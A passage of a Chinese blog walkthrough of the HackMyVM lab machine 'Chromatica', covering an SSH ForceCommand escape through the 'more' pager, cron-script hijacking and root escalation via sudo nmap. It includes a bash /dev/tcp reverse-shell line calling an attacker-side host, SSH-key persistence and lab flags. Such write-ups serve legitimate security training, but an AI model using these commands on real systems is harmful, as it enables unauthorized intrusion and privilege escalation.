登录，但是直接被弹出来了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Chromatica ssh dev@192.168.56.44      \ndev@192.168.56.44\u003cspan class=\"hljs-string\"\u003e's password: \nPermission denied, please try again.\ndev@192.168.56.44'\u003c/span\u003es password: \nGREETINGS,\nTHIS ACCOUNT IS NOT A LOGIN ACCOUNT\nIF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO\nEITHER CONTACT YOUR ADMIN\nOR THINK OUTSIDE THE BOX\nBE LAZY AND CONTACT YOUR ADMIN\nOR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,\nREGARDS\n\nbrightctf{ALM0ST_TH3R3_34897ffdf69}\nConnection to 192.168.56.44 closed.\n➜  Chromatica \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e信息：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e貌似是\u003ccode\u003eflag\u003c/code\u003e \u003ccode\u003ebrightctf{ALM0ST_TH3R3_34897ffdf69}\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e登陆后的信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e您好，\n此帐户并非登录帐户。\n如果您想维护此帐户，您必须\n联系您的管理员。\n或者，跳出固有思维模式。\n偷懒联系您的管理员。\n或者，您应该多动动脑子。\n此致\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e加上 \u003ccode\u003e-v\u003c/code\u003e 参数查看详细信息\u003c/p\u003e\n\u003cp\u003e输入密码后可以看到如下信息，表示已经登陆进去了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eAuthenticated to 192.168.56.44 ([192.168.56.44]:22) using \u003cspan class=\"hljs-string\"\u003e\"password\"\u003c/span\u003e.\ndebug1: channel 0: new session [client-session] (inactive \u003cspan class=\"hljs-built_in\"\u003etimeout\u003c/span\u003e: 0)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们想办法让连接保留下来，我们可以尝试将窗口缩小，例如：让信息不一下子展现出来\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMChromatica/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这样就保留连接了，然后因为\u003ccode\u003eMore\u003c/code\u003e和\u003ccode\u003eLess\u003c/code\u003e 在一定情况下都可以提权的，我们尝试输入\u003ccode\u003e!/bin/bash\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMChromatica/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这样就获得 \u003ccode\u003eshell\u003c/code\u003e 了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edev@Chromatica:~$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=1001(dev) gid=1001(dev) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=1001(dev)\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e为什么会被弹出去呢\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003edev\u003c/code\u003e 加目录中可以找到 \u003ccode\u003euser.txt\u003c/code\u003e 上面的是假的…\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edev@Chromatica:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \nbrightctf{ONE_OCKLOCK_8cfa57b4168}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在家目录中还存在一个脚本文件和\u003ccode\u003etxt\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edev@Chromatica:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e hello.txt \nGREETINGS,\nTHIS ACCOUNT IS NOT A LOGIN ACCOUNT\nIF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO\nEITHER CONTACT YOUR ADMIN\nOR THINK OUTSIDE THE BOX\nBE LAZY AND CONTACT YOUR ADMIN\nOR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,\nREGARDS\n\nbrightctf{ALM0ST_TH3R3_34897ffdf69}\ndev@Chromatica:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e bye.sh \n\u003cspan class=\"hljs-comment\"\u003e#̣!/bin/bash\u003c/span\u003e\n\n/usr/bin/more /home/dev/hello.txt\n\u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e 0\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e看样子是，是让我们登录就马上被赶出来的罪魁祸首。但是在仅仅有这两个文件是无法在我们登陆时直接赶走我们的，可能还存在定时任务，在我们登录时执行 \u003ccode\u003ebye.sh\u003c/code\u003e 脚本\u003c/p\u003e\n\u003cp\u003e最后可以在 \u003ccode\u003e/etc/ssh/sshd_config.d/dev_config.conf\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eForceCommand /home/dev/bye.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e作用是强制所有通过 SSH 登录的用户执行指定的命令，在这里就是 \u003ccode\u003e/home/dev/bye.sh\u003c/code\u003e 脚本。\u003c/p\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003ch3\u003eto analyst\u003c/h3\u003e\n\u003cp\u003e查看一下定时任务\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edev@Chromatica:/etc$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /etc/crontab\n\u003cspan class=\"hljs-comment\"\u003e# /etc/crontab: system-wide crontab\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# Unlike any other crontab you don't have to run the `crontab'\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# command to install the new version when you edit this file\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# and files in /etc/cron.d. These files also have username fields,\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# that none of the other crontabs do.\u003c/span\u003e\n\nSHELL=/bin/sh\n\u003cspan class=\"hljs-comment\"\u003e# You can also override PATH, but by default, newer versions inherit it from the environment\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# Example of job definition:\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# .---------------- minute (0 - 59)\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# |  .------------- hour (0 - 23)\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# |  |  .---------- day of month (1 - 31)\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# |  |  |  |  |\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# *  *  *  *  * user-name command to be executed\u003c/span\u003e\n17 *    * * *   root    \u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e / \u0026#x26;\u0026#x26; run-parts --report /etc/cron.hourly\n25 6    * * *   root    \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e -x /usr/sbin/anacron || ( \u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e / \u0026#x26;\u0026#x26; run-parts --report /etc/cron.daily )\n47 6    * * 7   root    \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e -x /usr/sbin/anacron || ( \u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e / \u0026#x26;\u0026#x26; run-parts --report /etc/cron.weekly )\n52 6    1 * *   root    \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e -x /usr/sbin/anacron || ( \u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e / \u0026#x26;\u0026#x26; run-parts --report /etc/cron.monthly )\n* *     * * *   analyst /bin/bash /opt/scripts/end_of_day.sh\n\u003cspan class=\"hljs-comment\"\u003e#\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e每分钟，系统都会以 \u003ccode\u003eanalyst\u003c/code\u003e 身份自动运行 \u003ccode\u003e/opt/scripts/end_of_day.sh\u003c/code\u003e 脚本；\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e* *     * * *   analyst /bin/bash /opt/scripts/end_of_day.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们查看一下该脚本的权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edev@Chromatica:/opt/scripts$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al\ntotal 12\ndrwxrwxrwx 2 root    root    4096 Apr 18  2024 .\ndrwxr-xr-x 6 root    root    4096 Apr 24  2024 ..\n-rwxrwxrw- 1 analyst analyst   30 Apr 19 08:00 end_of_day.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edev@Chromatica:/opt/scripts$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e end_of_day.sh \n\u003cspan class=\"hljs-comment\"\u003e#this is my end of day script\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e直接写入反弹\u003ccode\u003eshell\u003c/code\u003e语句\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"/bin/bash -c 'bash -i \u003e\u0026#x26; /dev/tcp/192.168.56.4/1234 0\u003e\u0026#x26;1'\"\u003c/span\u003e \u003e\u003e end_of_day.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Chromatica nc -lvp 1234             \nlistening on [any] 1234 ...\n192.168.56.44: inverse host lookup failed: Unknown host\nconnect to [192.168.56.4] from (UNKNOWN) [192.168.56.44] 44846\nbash: cannot \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e terminal process group (4181): Inappropriate ioctl \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e device\nbash: no job control \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e this shell\nanalyst@Chromatica:~$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拿到 \u003ccode\u003eshell\u003c/code\u003e 后第一件事进行持久化，写入公钥\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"ssh-rsa xxxxxx\"\u003c/span\u003e \u003e .ssh/authorized_keys\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eanalyst\u003c/code\u003e 家目录下也有 flag\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eanalyst@Chromatica:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e analyst.txt \nbrightctf{GAZETTO_RUKI_b2f4f50f398}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eto root\u003c/h3\u003e\n\u003cp\u003e查看 \u003ccode\u003eanalyst\u003c/code\u003e 的 \u003ccode\u003esudo\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eanalyst@Chromatica:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e analyst on Chromatica:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser analyst may run the following commands on Chromatica:\n    (ALL : ALL) NOPASSWD: /usr/bin/nmap\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看版本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eanalyst@Chromatica:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/bin/nmap --version\nNmap version 7.80 ( https://nmap.org )\nPlatform: x86_64-pc-linux-gnu\nCompiled with: liblua-5.3.6 openssl-3.0.2 nmap-libssh2-1.8.2 libz-1.2.11 libpcre-8.39 libpcap-1.10.1 nmap-libdnet-1.12 ipv6\nCompiled without:\nAvailable nsock engines: epoll poll \u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过执行脚本提权\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eanalyst@Chromatica:~$ TF=$(\u003cspan class=\"hljs-built_in\"\u003emktemp\u003c/span\u003e)\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'os.execute(\"/bin/sh\")'\u003c/span\u003e \u003e \u003cspan class=\"hljs-variable\"\u003e$TF\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e nmap --script=\u003cspan class=\"hljs-variable\"\u003e$TF\u003c/span\u003e\nStarting Nmap 7.80 ( https://nmap.org ) at 2025-04-19 08:24 UTC\nNSE: Warning: Loading \u003cspan class=\"hljs-string\"\u003e'/tmp/tmp.AJ6TtOxyfs'\u003c/span\u003e -- the recommended file extension is \u003cspan class=\"hljs-string\"\u003e'.nse'\u003c/span\u003e.\n\u003cspan class=\"hljs-comment\"\u003e# uid=0(root) gid=0(root) groups=0(root)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# brightctf{DIR_EN_GREY_59ce1d6c207}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e","title":"HackMyVM - Chromatica","date":"2025-04-19","updated":"2025-04-19","comments":true,"tags":["Linux靶机","HackMyVM","SQL注入"],"categories":"靶机"},"recentPosts":[{"id":"TryHackMeCreative","title":"TryHackMe - Creative","date":"2025-07-05","isEncrypted":false,"year":"2025","month":"07","day":"05"},{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Season8 - RustyKey","date":"2025-06-30","isEncrypted":true,"year":"2025","month":"06","day":"30"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Season8 - Artificial","date":"2025-06-28","isEncrypted":true,"year":"2025","month":"06","day":"28"},{"id":"HackTheBoxMachine - Developer","title":"HackTheBox - Machine - Developer","date":"2025-06-22","isEncrypted":false,"year":"2025","month":"06","day":"22"},{"id":"HackTheBoxMachine - TwoMillion","title":"HackTheBox - Machine - TwoMillion","date":"2025-06-21","isEncrypted":false,"year":"2025","month":"06","day":"21"},{"id":"群U靶机Tools","title":"群U靶机 - Tools","date":"2025-06-16","isEncrypted":false,"year":"2025","month":"06","day":"16"},{"id":"HackTheBoxMachine - Ellingson","title":"HackTheBox - Machine - Ellingson","date":"2025-06-15","isEncrypted":false,"year":"2025","month":"06","day":"15"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"04","day":"19","id":"HackMyVMChromatica"},"buildId":"Mvd-cXsbkhN4W5xziNlij","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>